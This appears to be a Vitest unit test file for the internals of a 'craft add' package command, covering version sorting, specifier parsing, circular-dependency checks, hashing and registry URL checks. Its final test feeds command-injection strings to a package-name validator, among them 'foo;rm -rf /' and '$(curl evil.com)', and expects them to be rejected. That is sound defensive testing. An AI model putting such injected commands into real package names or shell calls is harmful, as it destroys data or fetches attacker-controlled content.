import { describe, test, expect } from "vitest";
import { createHash } from "node:crypto";
import { _test } from "../src/add";

const {
  latestVersion,
  toImportName,
  parseSpecifier,
  checkCircularDeps,
  sha256,
  isOfficialRegistry,
  SAFE_PKG_RE,
} = _test;

describe("craft add internals", () => {
  // ── latestVersion ────────────────────────────────────────────────

  describe("latestVersion", () => {
    /**
     * @case Returns the only version when there is one entry
     * @preconditions Registry entry with a single version "1.0.0"
     * @expectedResult Returns "1.0.0"
     */
    test("returns single version", () => {
      const entry = { versions: { "1.0.0": { sha256: "abc" } } };
      expect(latestVersion(entry)).toBe("1.0.0");
    });

    /**
     * @case Returns the highest version from multiple entries
     * @preconditions Registry entry with versions 1.0.0, 2.0.0, 1.5.0
     * @expectedResult Returns "2.0.0"
     */
    test("returns highest version with numeric sorting", () => {
      const entry = {
        versions: {
          "1.0.0": { sha256: "a" },
          "2.0.0": { sha256: "b" },
          "1.5.0": { sha256: "c" },
        },
      };
      expect(latestVersion(entry)).toBe("2.0.0");
    });

    /**
     * @case Handles double-digit version segments correctly
     * @preconditions Versions 1.9.0 and 1.10.0 (10 > 9 numerically)
     * @expectedResult Returns "1.10.0"
     */
    test("sorts 1.10.0 above 1.9.0", () => {
      const entry = {
        versions: {
          "1.9.0": { sha256: "a" },
          "1.10.0": { sha256: "b" },
        },
      };
      expect(latestVersion(entry)).toBe("1.10.0");
    });

    /**
     * @case Throws on empty versions object
     * @preconditions Registry entry with no versions
     * @expectedResult Throws "No versions available"
     */
    test("throws on empty versions", () => {
      const entry = { versions: {} };
      expect(() => latestVersion(entry)).toThrow("No versions available");
    });
  });

  // ── toImportName ─────────────────────────────────────────────────

  describe("toImportName", () => {
    /**
     * @case Converts hyphenated id to camelCase with Capability suffix
     * @preconditions id = "elastic-logs"
     * @expectedResult Returns "elasticLogsCapability"
     */
    test("converts hyphenated id", () => {
      expect(toImportName("elastic-logs")).toBe("elasticLogsCapability");
    });

    /**
     * @case Handles single-word id
     * @preconditions id = "timer"
     * @expectedResult Returns "timerCapability"
     */
    test("handles single-word id", () => {
      expect(toImportName("timer")).toBe("timerCapability");
    });

    /**
     * @case Handles multi-segment hyphenated id
     * @preconditions id = "my-cool-adapter"
     * @expectedResult Returns "myCoolAdapterCapability"
     */
    test("handles multi-segment id", () => {
      expect(toImportName("my-cool-adapter")).toBe("myCoolAdapterCapability");
    });
  });

  // ── parseSpecifier ───────────────────────────────────────────────

  describe("parseSpecifier", () => {
    /**
     * @case Parses id without version
     * @preconditions specifier = "elastic-logs"
     * @expectedResult Returns { id: "elastic-logs", version: undefined }
     */
    test("parses id without version", () => {
      expect(parseSpecifier("elastic-logs")).toEqual({
        id: "elastic-logs",
      });
    });

    /**
     * @case Parses id with version
     * @preconditions specifier = "elastic-logs@1.0.0"
     * @expectedResult Returns { id: "elastic-logs", version: "1.0.0" }
     */
    test("parses id@version", () => {
      expect(parseSpecifier("elastic-logs@1.0.0")).toEqual({
        id: "elastic-logs",
        version: "1.0.0",
      });
    });

    /**
     * @case Handles scoped-like ids (uses lastIndexOf)
     * @preconditions specifier = "my-cap@2.3.4"
     * @expectedResult Splits at the last @ correctly
     */
    test("splits at last @ for version", () => {
      expect(parseSpecifier("my-cap@2.3.4")).toEqual({
        id: "my-cap",
        version: "2.3.4",
      });
    });

    /**
     * @case Handles specifier with no @ sign
     * @preconditions specifier = "simple"
     * @expectedResult Returns { id: "simple" } with no version
     */
    test("returns id only when no @", () => {
      const result = parseSpecifier("simple");
      expect(result.id).toBe("simple");
      expect(result.version).toBeUndefined();
    });
  });

  // ── checkCircularDeps ────────────────────────────────────────────

  describe("checkCircularDeps", () => {
    /**
     * @case Does not throw when chain is empty
     * @preconditions Empty dependency chain
     * @expectedResult No error thrown
     */
    test("does not throw for empty chain", () => {
      expect(() => checkCircularDeps("a", "1.0.0", [])).not.toThrow();
    });

    /**
     * @case Does not throw when id is not in chain
     * @preconditions Chain contains different packages
     * @expectedResult No error thrown
     */
    test("does not throw when id not in chain", () => {
      expect(() =>
        checkCircularDeps("c", "1.0.0", ["a@1.0.0", "b@1.0.0"]),
      ).not.toThrow();
    });

    /**
     * @case Throws when id@version already in chain
     * @preconditions Chain contains "a@1.0.0" and we check "a" at "1.0.0"
     * @expectedResult Throws with circular dependency message
     */
    test("throws on circular dependency", () => {
      expect(() =>
        checkCircularDeps("a", "1.0.0", ["a@1.0.0", "b@1.0.0"]),
      ).toThrow("Circular dependency detected");
    });
  });

  // ── sha256 ───────────────────────────────────────────────────────

  describe("sha256", () => {
    /**
     * @case Computes correct SHA-256 for a known input
     * @preconditions Buffer containing "hello world"
     * @expectedResult Matches Node crypto hash of the same input
     */
    test("computes correct hash", () => {
      const buf = Buffer.from("hello world", "utf-8");
      const expected = createHash("sha256").update(buf).digest("hex");
      expect(sha256(buf)).toBe(expected);
    });

    /**
     * @case Produces different hashes for different content
     * @preconditions Two different buffers
     * @expectedResult Hashes are not equal
     */
    test("different content produces different hash", () => {
      const a = Buffer.from("aaa", "utf-8");
      const b = Buffer.from("bbb", "utf-8");
      expect(sha256(a)).not.toBe(sha256(b));
    });

    /**
     * @case Empty buffer produces a valid hash
     * @preconditions Empty Buffer
     * @expectedResult Returns 64-character hex string
     */
    test("handles empty buffer", () => {
      const hash = sha256(Buffer.alloc(0));
      expect(hash).toHaveLength(64);
      expect(hash).toMatch(/^[0-9a-f]{64}$/);
    });
  });

  // ── isOfficialRegistry ───────────────────────────────────────────

  describe("isOfficialRegistry", () => {
    /**
     * @case Recognises the default GitHub raw URL as official
     * @preconditions Default registry URL
     * @expectedResult Returns true
     */
    test("accepts default registry URL", () => {
      expect(
        isOfficialRegistry(
          "https://raw.githubusercontent.com/routecraftjs/routecraft-registry/refs/heads/main/",
        ),
      ).toBe(true);
    });

    /**
     * @case Recognises github.com/routecraftjs as official
     * @preconditions URL containing github.com/routecraftjs
     * @expectedResult Returns true
     */
    test("accepts github.com/routecraftjs URL", () => {
      expect(
        isOfficialRegistry(
          "https://github.com/routecraftjs/routecraft-registry",
        ),
      ).toBe(true);
    });

    /**
     * @case Recognises registry.routecraft.dev as official
     * @preconditions URL containing registry.routecraft.dev
     * @expectedResult Returns true
     */
    test("accepts registry.routecraft.dev", () => {
      expect(isOfficialRegistry("https://registry.routecraft.dev/v1")).toBe(
        true,
      );
    });

    /**
     * @case Rejects arbitrary third-party URLs
     * @preconditions URL for an external domain
     * @expectedResult Returns false
     */
    test("rejects unofficial URL", () => {
      expect(isOfficialRegistry("https://registry.acme.com")).toBe(false);
    });
  });

  // ── SAFE_PKG_RE ──────────────────────────────────────────────────

  describe("SAFE_PKG_RE", () => {
    /**
     * @case Matches simple unscoped package names
     * @preconditions Common npm package names
     * @expectedResult All match
     */
    test("matches unscoped packages", () => {
      expect(SAFE_PKG_RE.test("zod")).toBe(true);
      expect(SAFE_PKG_RE.test("express")).toBe(true);
      expect(SAFE_PKG_RE.test("my-package")).toBe(true);
    });

    /**
     * @case Matches scoped package names
     * @preconditions Scoped npm package names
     * @expectedResult All match
     */
    test("matches scoped packages", () => {
      expect(SAFE_PKG_RE.test("@routecraft/routecraft")).toBe(true);
      expect(SAFE_PKG_RE.test("@types/node")).toBe(true);
    });

    /**
     * @case Rejects names with shell metacharacters
     * @preconditions Package names containing ;, $, backtick, etc.
     * @expectedResult All fail to match
     */
    test("rejects shell metacharacters", () => {
      expect(SAFE_PKG_RE.test("foo;rm -rf /")).toBe(false);
      expect(SAFE_PKG_RE.test("$(curl evil.com)")).toBe(false);
      expect(SAFE_PKG_RE.test("foo`whoami`")).toBe(false);
      expect(SAFE_PKG_RE.test("foo bar")).toBe(false);
    });
  });
});
